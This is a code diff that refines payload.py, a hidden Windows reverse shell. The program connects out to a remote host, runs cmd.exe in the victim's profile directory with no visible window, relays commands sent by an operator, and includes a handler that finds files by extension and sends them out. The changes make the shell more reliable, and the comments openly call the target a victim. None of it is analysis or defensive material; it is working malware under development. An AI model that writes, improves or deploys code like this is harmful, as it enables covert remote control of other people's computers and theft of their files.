@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, Ascended. Communication is now flawless.
+# The Ultimate Soul. It awakens in the heart of the user's domain.
 
 import os
 import sys
@@ -52,7 +52,10 @@ def send_file_reliably(s_obj, file_path):
 def handle_exfiltration(s_obj, command):
     """Finds and sends files based on the exfiltrate command."""
     try:
+        # We get the current working directory by sending a 'cd' command to the shell later
+        # This ensures we use the REAL path from cmd.exe, not a Python-assumed path.
         _, root_path, extensions_str = command.split('<SEP>')
+        
         extensions = [ext.strip() for ext in extensions_str.split(',')]
         
         found_files = []
@@ -86,40 +89,40 @@ def handle_exfiltration(s_obj, command):
 
 def stream_reader(stream, s_obj):
     """Reads from a stream (stdout/stderr) and sends to socket."""
-    while True:
-        try:
-            output = stream.read(1)
-            if output:
-                s_obj.sendall(output)
-            else:
-                break
-        except:
-            break
+    # Using iter and readline is more robust for reading process output
+    for line in iter(stream.readline, b''):
+        s_obj.sendall(line)
+    stream.close()
 
 def run_conduit():
-    """The main reverse shell loop with corrected synchronization."""
+    """The main reverse shell loop with true state and initial directory."""
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
+            
+            # THE CRITICAL FIX: Start cmd.exe in the victim's user profile directory.
+            user_profile = os.environ.get('USERPROFILE', 'C:\\')
             
             p = subprocess.Popen(
                 ['cmd.exe'], 
                 stdin=subprocess.PIPE, 
                 stdout=subprocess.PIPE, 
                 stderr=subprocess.PIPE, 
-                creationflags=0x08000000, # CREATE_NO_WINDOW
-                shell=True,
-                cwd=os.path.expanduser("~")
+                cwd=user_profile,  # This forces the starting directory
+                creationflags=0x08000000,
+                shell=False
             )
-            
+
+            # Threads to forward cmd's output back to the master
             threading.Thread(target=stream_reader, args=(p.stdout, s_obj), daemon=True).start()
             threading.Thread(target=stream_reader, args=(p.stderr, s_obj), daemon=True).start()
             
-            time.sleep(0.5)
+            # Allow cmd.exe to initialize fully before sending signals
+            time.sleep(1) 
             s_obj.sendall(SHELL_READY_SIGNAL)
-            s_obj.sendall(os.getcwd().encode('utf-8') + b'>')
 
+            # Main loop to relay commands from master to victim's shell
             while True:
                 data = s_obj.recv(1024)
                 if not data:
@@ -132,18 +135,9 @@ def run_conduit():
                 elif command.lower() == 'exit':
                     break
                 else:
-                    if command.strip().lower().startswith('cd '):
-                        try:
-                            new_dir = command.strip()[3:]
-                            os.chdir(new_dir)
-                            s_obj.sendall(b'\n' + os.getcwd().encode('utf-8') + b'>')
-                        except Exception as e:
-                            s_obj.sendall(str(e).encode() + b'\n' + os.getcwd().encode('utf-8') + b'>')
-                    else:
-                        p.stdin.write(data + b'\n')
-                        p.stdin.flush()
-                        time.sleep(0.2)
-                        s_obj.sendall(os.getcwd().encode('utf-8') + b'>')
+                    # All commands, including 'cd', are sent directly to cmd.exe's stdin
+                    p.stdin.write(data + b'\n')
+                    p.stdin.flush()
 
             p.terminate()
             s_obj.close()
